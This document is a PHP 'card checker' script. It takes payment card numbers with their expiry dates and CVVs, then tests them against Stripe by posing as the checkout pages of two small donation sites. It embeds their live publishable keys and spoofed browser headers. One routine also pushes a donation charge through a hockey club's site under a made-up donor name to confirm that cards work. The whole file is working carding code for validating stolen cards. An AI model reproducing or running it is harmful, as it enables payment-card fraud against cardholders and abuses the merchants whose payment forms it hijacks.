<?php

class gate
{
    public function bin_curl($cc)
    {
        $bin = substr($cc, 0, 6);
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, "https://lookup.binlist.net/$bin");
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        $result_bin = curl_exec($c);
        curl_close($c);
        $ident = json_decode($result_bin);
        $ccbank = (isset($ident->bank->name) ? strtoupper($ident->bank->name) : "Not Have Bank Name");
        $cctype = (isset($ident->type) ? strtoupper($ident->type) : "Not Have Type");
        $cclevel = (isset($ident->brand) ? strtoupper($ident->brand) : "Not Have Level");
        return $ccbank." ".$cctype." ".$cclevel;
    }
    public function gate_no_charge($cc, $month, $year, $cvv, $d,$bin)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "email=gigolo3nd%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fmilfordsportshalloffame.com%2Fdonate.php&pasted_fields=number&card[number]=$cc&card[exp_month]=$month&card[exp_year]=$year&card[cvc]=$cvv&card[name]=gigolo3nd%40gmail.com&time_on_page=31793&guid=c551601b-bf01-4493-af88-8d422f4a9eb0&muid=9d968270-4447-4de7-8a45-f32887a3e6ac&sid=336d6d2a-6e7e-45db-a900-0f940566462d&key=pk_live_EPiQ4fpeIVfi2UTEeLVBrX0O");
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

        $headers = array();
        $headers[] = 'Authority: api.stripe.com';
        $headers[] = 'Accept: application/json';
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'Accept-Language: en-US';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
        $headers[] = 'Dnt: 1';
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $headers[] = 'Origin: https://checkout.stripe.com';
        $headers[] = 'Sec-Fetch-Site: same-site';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=50ff4f38-5edb-6328-0d8a-aeb9feef7b00';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $api = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);
        $hasil = json_decode($api);
        if (isset($hasil->id)) {
            $status = "Live";
            $status_check = true;
        } else if ($hasil->error->code) {
            $status = $hasil->error->code;
            $status_check = false;
        } else {
            $status = "unkown";
        }
        $array = ["data" => $d, "BIN" => $bin,"status" => $status, "status_check" => $status_check];
        return $array;
    }
    public function gate_1usd($cc, $month, $year, $cvv, $d,$bin){
        $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "email=gigolo3nd%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=http%3A%2F%2Fbravehockey.club%2Fdonate_checkout.php&pasted_fields=number&card[number]=$cc&card[exp_month]=$month&card[exp_year]=$year&card[cvc]=$cvv&card[name]=gigolo3nd%40gmail.com&time_on_page=32268&guid=c551601b-bf01-4493-af88-8d422f4a9eb0&muid=f27c2fc6-b373-4dc0-a07d-5b3b0284343e&sid=df26a1f7-4621-4c88-901e-b683fcbf4920&key=pk_live_bdsNTZsIbC3eMbGbB9FDLkay");
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers = array();
    $headers[] = 'Authority: api.stripe.com';
    $headers[] = 'Accept: application/json';
    $headers[] = 'Sec-Fetch-Dest: empty';
    $headers[] = 'Accept-Language: en-US';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
    $headers[] = 'Dnt: 1';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Origin: https://checkout.stripe.com';
    $headers[] = 'Sec-Fetch-Site: same-site';
    $headers[] = 'Sec-Fetch-Mode: cors';
    $headers[] = 'Referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=dc247bc1-8cdb-40b6-e049-1fb2142286b5';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $api = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);

    $hasil = json_decode($api);
    if (isset($hasil->id)) {
        $this->ekseskusi($hasil->id);
        $status = "live";
        $status_check = true;
        }elseif ($hasil->error->code) {
            $status = $hasil->error->message;
            $status_check = false;
        }
        $array = ["data" => $d,"BIN" => $bin, "status" => $status, "status_check" => $status_check];
        return $array;
    }
    public function ekseskusi($id)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, 'http://bravehockey.club/assets/php/store/stripe/donate.php');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "donate_name=Jeffrey+Sloan&donate_phone=6233357238&donate_email=gigolo3nd%40gmail.com&donate_amount=100&stripeToken=$id&stripeTokenType=card&stripeEmail=gigolo3nd%40gmail.com");
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

        $headers = array();
        $headers[] = 'Connection: keep-alive';
        $headers[] = 'Cache-Control: max-age=0';
        $headers[] = 'Origin: http://bravehockey.club';
        $headers[] = 'Upgrade-Insecure-Requests: 1';
        $headers[] = 'Dnt: 1';
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
        $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
        $headers[] = 'Referer: http://bravehockey.club/donate_checkout.php';
        $headers[] = 'Accept-Language: en-US,en;q=0.9,id;q=0.8,ja;q=0.7,zh-TW;q=0.6,zh;q=0.5';
        $headers[] = 'Cookie: _ga=GA1.2.1731260260.1585266781; _gid=GA1.2.1118180657.1585266781';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $final = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);
    }
}
